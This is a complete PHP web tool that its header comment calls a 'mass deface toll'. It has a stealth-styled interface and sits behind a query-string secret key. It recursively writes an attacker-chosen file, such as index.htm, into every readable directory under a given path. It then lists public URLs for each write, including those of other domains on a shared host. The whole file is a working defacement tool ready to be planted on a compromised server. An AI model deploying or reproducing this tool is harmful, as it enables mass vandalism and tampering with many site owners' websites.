<?php
// Stealth Recursive Folder Writer — Fixed by 0x6ick + Nyx6st
/**
            * mass deface toll by 0x6ick ( Copyright 2025 by 6ickwhispers@gmail.com
          **/
$auth_key = "mySecretKey"; //?auth=massSecretKey

if (!isset($_GET['auth']) || $_GET['auth'] !== $auth_key) {
    http_response_code(403);
    exit("Forbidden");
}

$logOutput = "";
$totalSuccess = 0;
$totalFail = 0;

function writeToAllDirs($base, $filename, $payload) {
    global $logOutput, $totalSuccess, $totalFail;

    if (!is_dir($base) || !is_readable($base)) {
        $logOutput .= "[-] Cannot access: $base<br>";
        return;
    }

    $targetFile = rtrim($base, '/') . '/' . $filename;

    if (@file_put_contents($targetFile, $payload)) {
        $fullRealPath = realpath($targetFile);

        // Coba extract domain dari path
        if (preg_match('#/domains/([^/]+)/public_html/(.*)$#', $fullRealPath, $matches)) {
            $domain = $matches[1]; // ex: site2.com
            $relativePath = '/' . $matches[2];
        } else {
            // fallback ke document root biasa
            $docRootPath = realpath($_SERVER['DOCUMENT_ROOT']);
            $relativePath = str_replace($docRootPath, '', $fullRealPath);
            $relativePath = '/' . ltrim($relativePath, '/');
            $domain = $_SERVER['HTTP_HOST'];
        }

        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $fullURL = $protocol . '://' . $domain . $relativePath;

        $logOutput .= '[+] Written to: <a href="' . htmlspecialchars($fullURL) . '" target="_blank">' . htmlspecialchars($fullURL) . '</a><br>';
        $totalSuccess++;
    } else {
        $logOutput .= "[-] Failed write: $targetFile<br>";
        $totalFail++;
    }

    $dirs = scandir($base);
    if ($dirs === false) return;

    foreach ($dirs as $d) {
        if ($d === '.' || $d === '..') continue;
        $subPath = $base . '/' . $d;
        if (is_dir($subPath)) {
            writeToAllDirs($subPath, $filename, $payload);
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetDir = $_POST['d'] ?? getcwd();
    $filename = $_POST['f'] ?? 'index.htm';
    $payload = $_POST['c'] ?? 'Welcome to stealth write';
    writeToAllDirs($targetDir, $filename, $payload);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>🕶️ Stealth Recursive Writer</title>
    <style>
        body {
            background: linear-gradient(135deg, #0f172a, #020617);
            color: #f1f5f9;
            font-family: 'Fira Code', monospace;
            display: flex;
            justify-content: center;
            padding: 60px 20px;
        }
        .container {
            background: #1e293b;
            padding: 30px;
            border-radius: 14px;
            box-shadow: 0 0 20px #6366f1aa;
            max-width: 650px;
            width: 100%;
        }
        label {
            display: block;
            margin-top: 18px;
            font-weight: 600;
            color: #cbd5e1;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px 14px;
            border: 1px solid #334155;
            border-radius: 8px;
            background: #0f172a;
            color: #e2e8f0;
            font-size: 14px;
            margin-top: 5px;
            box-sizing: border-box;
        }
        textarea {
            resize: vertical;
            min-height: 120px;
        }
        input[type="submit"] {
            margin-top: 25px;
            background: #6366f1;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
        }
        input[type="submit"]:hover {
            background: #4f46e5;
        }
        h3 {
            text-align: center;
            color: #a5b4fc;
            margin-bottom: 20px;
        }
        .output {
            background: #0f172a;
            margin-top: 30px;
            padding: 20px;
            border-radius: 10px;
            max-height: 400px;
            overflow-y: auto;
            font-size: 14px;
            line-height: 1.6;
            border: 1px solid #334155;
        }
        a {
            color: #38bdf8;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
            color: #0ea5e9;
        }
    </style>
</head>
<body>
<div class="container">
    <h3>🛠️ Stealth Recursive Folder Writer</h3>
    <form method="POST">
        <label>📂 Base Directory:</label>
        <input type="text" name="d" value="<?= htmlspecialchars($_POST['d'] ?? getcwd()) ?>" required>

        <label>📄 Filename to Write:</label>
        <input type="text" name="f" value="<?= htmlspecialchars($_POST['f'] ?? 'index.htm') ?>" required>

        <label>🧾 Payload Content:</label>
        <textarea name="c" required><?= htmlspecialchars($_POST['c'] ?? 'Welcome to stealth write by 0x6ick') ?></textarea>

        <input type="submit" value="🚀 Deploy Recursively">
    </form>

    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
        <div class="output">
            <b>✅ Success:</b> <?= $totalSuccess ?><br>
            <b>❌ Failed:</b> <?= $totalFail ?><br>
            <hr>
            <?= $logOutput ?>
        </div>
    <?php endif; ?>
</div>
</body>
</html>
